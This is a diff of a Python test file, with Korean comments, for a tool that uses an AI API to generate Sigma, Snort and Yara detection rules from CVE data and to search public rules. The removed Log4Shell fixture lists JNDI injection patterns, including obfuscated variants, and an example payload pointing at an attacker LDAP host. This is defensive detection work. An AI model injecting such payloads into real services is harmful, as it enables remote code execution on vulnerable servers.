@@ -146,155 +146,70 @@ def test_a_observable_gate():
 # Test B: AI 룰 생성 (실제 Groq API 호출)
 # ============================================================================
 
-def test_b_ai_rule_generation(self):
-    """Test B: AI 룰 생성 테스트 (실제 API 호출) - 수정본"""
-    self._print_header("Test B: AI 룰 생성 테스트 (실제 API 호출)")
+def test_b_ai_rule_generation():
+    """Test B: AI 룰 생성 테스트 (실제 Groq API 호출)"""
+    separator("Test B: AI 룰 생성 테스트 (실제 API 호출)")
 
-    rule_mgr = RuleManager()
+    from rule_manager import RuleManager
+    rm = RuleManager()
 
-    # ── 풍부한 지표를 가진 실제 CVE 데이터 (CVE-2021-44228 Log4Shell 기반) ──
-    rich_cve_data = {
-        "cve_id": "CVE-2021-44228",
-        "description": (
-            "Apache Log4j2 2.0-beta9 through 2.15.0 (excluding security releases 2.12.2, "
-            "2.12.3, and 2.3.1) JNDI features used in configuration, log messages, and "
-            "parameters do not protect against attacker controlled LDAP and other JNDI "
-            "related endpoints. An attacker who can control log messages or log message "
-            "parameters can execute arbitrary code loaded from LDAP servers when message "
-            "lookup substitution is enabled."
+    # RICH_CVE_DATA를 사용하여 AI 룰 생성 테스트
+    cve_data = RICH_CVE_DATA.copy()
+
+    # AI 분석 결과 시뮬레이션 (분석이 이미 완료된 상태)
+    mock_analysis = {
+        "root_cause": "Apache Struts의 OGNL 인젝션을 통한 원격 코드 실행 취약점",
+        "attack_scenario": (
+            "공격자가 Content-Type HTTP 헤더에 OGNL 표현식을 삽입하여 "
+            "/struts2-showcase/fileupload.action 엔드포인트를 통해 원격 코드 실행"
         ),
-        "cvss_score": 10.0,
-        "severity": "CRITICAL",
-        "affected_product": "Apache Log4j",
-        "affected_versions": "2.0-beta9 ~ 2.15.0",
-        "vendor": "Apache Software Foundation",
-        "attack_vector": "NETWORK",
-        "cwe_id": "CWE-917",
-        "references": [
-            "https://logging.apache.org/log4j/2.x/security.html",
-            "https://www.lunasec.io/docs/blog/log4j-zero-day/",
-        ],
-        # ── AI 룰 생성에 필요한 구체적 지표들 ──
-        "observable_indicators": {
-            "file_paths": [
-                "/log4j-core-2.14.1.jar",
-                "/org/apache/logging/log4j/core/lookup/JndiLookup.class",
-            ],
-            "network_indicators": {
-                "protocols": ["HTTP", "LDAP", "RMI"],
-                "ports": [80, 443, 389, 1099, 1389, 8080, 8443],
-                "uri_patterns": [
-                    "${jndi:ldap://",
-                    "${jndi:rmi://",
-                    "${jndi:dns://",
-                    "${jndi:ldaps://",
-                    "${${lower:j}ndi:",
-                    "${${upper:j}ndi:",
-                    "${${::-j}ndi:",
-                ],
-            },
-            "http_indicators": {
-                "headers": [
-                    "User-Agent",
-                    "X-Forwarded-For",
-                    "Referer",
-                    "X-Api-Version",
-                    "Authorization",
-                ],
-                "methods": ["GET", "POST"],
-                "content_patterns": [
-                    "${jndi:ldap://",
-                    "${jndi:rmi://",
-                ],
-            },
-            "file_indicators": {
-                "hashes": {
-                    "md5": "6b1aff7f3a5d4764c6de2a05782f04e8",
-                    "sha256": "bf4f41403280c1b115650d470f9b260a5c9042c04d9bcc2a6ca504a66379b2d6",
-                },
-                "strings": [
-                    "JndiLookup",
-                    "JndiManager",
-                    "log4j-core",
-                    "${jndi:",
-                ],
-                "class_names": [
-                    "org.apache.logging.log4j.core.lookup.JndiLookup",
-                    "org.apache.logging.log4j.core.net.JndiManager",
-                ],
-            },
-        },
-        # ── 분석 결과 (AI 분석이 이미 완료된 상태 시뮬레이션) ──
-        "analysis": {
-            "root_cause": (
-                "Log4j2의 JNDI Lookup 기능이 로그 메시지 내 ${jndi:...} 패턴을 "
-                "자동으로 해석하여 원격 LDAP/RMI 서버에 접속, 임의 Java 클래스를 "
-                "로드·실행할 수 있는 원격 코드 실행 취약점"
-            ),
-            "attack_scenario": (
-                "공격자가 HTTP 헤더(User-Agent, X-Forwarded-For 등)에 "
-                "${jndi:ldap://attacker.com/exploit} 페이로드를 삽입하면, "
-                "Log4j가 해당 문자열을 로깅하면서 JNDI Lookup을 수행하고, "
-                "공격자의 LDAP 서버에서 악성 Java 클래스를 다운로드·실행"
-            ),
-            "feasibility": True,
-        },
+        "impact": "서버 전체 제어 가능",
+        "mitigation": ["Apache Struts 2.5.31 이상으로 업데이트", "WAF 규칙 추가"],
+        "rule_feasibility": True
     }
 
-    rule_types = ["sigma", "snort", "yara"]
+    rule_types = ["Sigma", "Snort", "Yara"]
     results = {}
 
     for i, rule_type in enumerate(rule_types, 1):
-        logger.info(f"  [{i}/{len(rule_types)}] {rule_type.capitalize()} 룰 생성 시도...")
+        logger.info(f"  [{i}/{len(rule_types)}] {rule_type} AI 룰 생성 시도...")
 
         try:
-            if rule_type == "sigma":
-                result = rule_mgr.generate_sigma(rich_cve_data)
-            elif rule_type == "snort":
-                result = rule_mgr.generate_snort(rich_cve_data)
-            elif rule_type == "yara":
-                result = rule_mgr.generate_yara(rich_cve_data)
+            ai_result = rm._generate_ai_rule(rule_type, cve_data, mock_analysis)
 
-            if result and result.get("status") != "SKIP":
+            if ai_result:
+                code, indicators = ai_result
                 results[rule_type] = True
-                rule_content = result.get("rule", result.get("content", ""))
-                # 생성된 룰의 처음 200자만 출력 (디버깅용)
-                preview = rule_content[:200] if isinstance(rule_content, str) else str(rule_content)[:200]
-                logger.info(f"  ✅ {rule_type.capitalize()} 생성 성공")
+                preview = code[:200] if isinstance(code, str) else str(code)[:200]
+                logger.info(f"  ✅ {rule_type} 생성 성공")
                 logger.info(f"     미리보기: {preview}...")
             else:
                 results[rule_type] = False
-                skip_reason = "AI가 SKIP 반환"
-                if result and isinstance(result, dict):
-                    skip_reason = result.get("reason", result.get("skip_reason", skip_reason))
-                logger.warning(f"  ⛔ {rule_type.capitalize()}: {skip_reason}")
-                # ── 디버깅: AI가 왜 거부했는지 상세 출력 ──
-                logger.warning(f"     → 전달된 지표 수: file_paths={len(rich_cve_data.get('observable_indicators', {}).get('file_paths', []))}, "
-                             f"uri_patterns={len(rich_cve_data.get('observable_indicators', {}).get('network_indicators', {}).get('uri_patterns', []))}, "
-                             f"file_hashes={len(rich_cve_data.get('observable_indicators', {}).get('file_indicators', {}).get('hashes', {}))}")
+                logger.warning(f"  ⛔ {rule_type}: AI가 생성 거부 또는 검증 실패")
 
         except Exception as e:
             results[rule_type] = False
-            logger.error(f"  ❌ {rule_type.capitalize()} 생성 중 예외: {type(e).__name__}: {e}")
+            logger.error(f"  ❌ {rule_type} 생성 중 예외: {type(e).__name__}: {e}")
 
-    # ── 결과 판정 ──
+        time.sleep(3)  # rate limit 여유
+
+    # 결과 판정
     success_count = sum(1 for v in results.values() if v)
     total = len(rule_types)
 
     for rule_type in rule_types:
         status = "✅ PASS" if results.get(rule_type) else "❌ FAIL"
-        logger.info(f"  {status}: {rule_type.capitalize()} AI 생성")
+        logger.info(f"  {status}: {rule_type} AI 생성")
 
-    print(f"\n  📊 AI 룰 생성: {success_count}/{total} 성공")
+    logger.info(f"\n  📊 AI 룰 생성: {success_count}/{total} 성공")
 
     if success_count == 0:
         logger.warning("  ⚠️ 모든 룰 생성 실패! 아래 사항을 점검하세요:")
         logger.warning("     1. Groq API 키 및 모델 가용성")
-        logger.warning("     2. generate_sigma/snort/yara 메서드의 프롬프트")
-        logger.warning("     3. Observable Gate 통과 후 AI 프롬프트에 지표가 전달되는지")
+        logger.warning("     2. AI 프롬프트에 지표가 전달되는지")
 
     # 최소 1개 이상 성공하면 PASS
-    self.test_results["B"] = success_count >= 1
+    return success_count >= 1
 
 # ============================================================================
 # Test C: 공개 룰 검색 (search_public_only)
@@ -315,19 +230,43 @@ def test_c_public_rule_search():
     if rules.get('sigma'):
         found.append("Sigma")
         logger.info(f"  ✅ Sigma: {rules['sigma']['source']}")
+        logger.info(f"     ── Sigma 룰 내용 ──")
+        for line in rules['sigma']['code'].strip().splitlines()[:20]:
+            logger.info(f"     {line}")
+        if len(rules['sigma']['code'].strip().splitlines()) > 20:
+            logger.info(f"     ... (총 {len(rules['sigma']['code'].strip().splitlines())}줄)")
     if rules.get('network'):
         found.append(f"Network({len(rules['network'])})")
         for nr in rules['network']:
             logger.info(f"  ✅ Network: {nr['source']} ({nr['engine']})")
+            rule_preview = nr['code'][:300] if len(nr['code']) > 300 else nr['code']
+            logger.info(f"     ── {nr['engine']} 룰 내용 ──")
+            logger.info(f"     {rule_preview}")
     if rules.get('yara'):
         found.append("Yara")
         logger.info(f"  ✅ Yara: {rules['yara']['source']}")
+        logger.info(f"     ── Yara 룰 내용 ──")
+        for line in rules['yara']['code'].strip().splitlines()[:15]:
+            logger.info(f"     {line}")
     if rules.get('nuclei'):
         found.append("Nuclei")
         logger.info(f"  ✅ Nuclei: {rules['nuclei']['source']}")
-    
+        logger.info(f"     ── Nuclei 템플릿 내용 ──")
+        for line in rules['nuclei']['code'].strip().splitlines()[:20]:
+            logger.info(f"     {line}")
+        if len(rules['nuclei']['code'].strip().splitlines()) > 20:
+            logger.info(f"     ... (총 {len(rules['nuclei']['code'].strip().splitlines())}줄)")
+
     logger.info("")
     result_badge(len(found) > 0, f"공개 룰 검색 ({', '.join(found) if found else '없음'})")
+
+    if found:
+        logger.info("")
+        logger.info("  📋 보안 담당자 안내: 위 룰을 복사하여 장비에 등록하세요.")
+        logger.info("     Sigma → SIEM (Splunk, ELK 등)")
+        logger.info("     Network → IDS/IPS (Snort, Suricata)")
+        logger.info("     Yara → 파일/메모리 스캐너")
+        logger.info("     Nuclei → 취약점 스캐너")
     
     # 존재하지 않는 CVE도 테스트
     logger.info(f"\n  CVE-2099-99999 (존재하지 않는 CVE) 검색 중...")
